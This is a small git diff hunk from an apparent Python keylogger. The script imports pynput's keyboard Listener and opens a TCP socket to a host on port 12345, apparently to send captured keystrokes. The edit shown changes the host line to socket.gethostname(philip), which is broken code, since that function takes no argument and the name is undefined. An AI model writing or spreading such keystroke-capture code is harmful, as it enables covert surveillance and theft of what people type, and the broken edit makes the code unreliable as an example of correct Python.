@@ -3,7 +3,7 @@ import socket
 from pynput.keyboard import Key, Listener
 
 # Create Socket and Connect to Host
-host = socket.gethostname()
+host = socket.gethostname(philip)
 port = 12345
 s = socket.socket()		# TCP socket object
 s.connect((host,port))
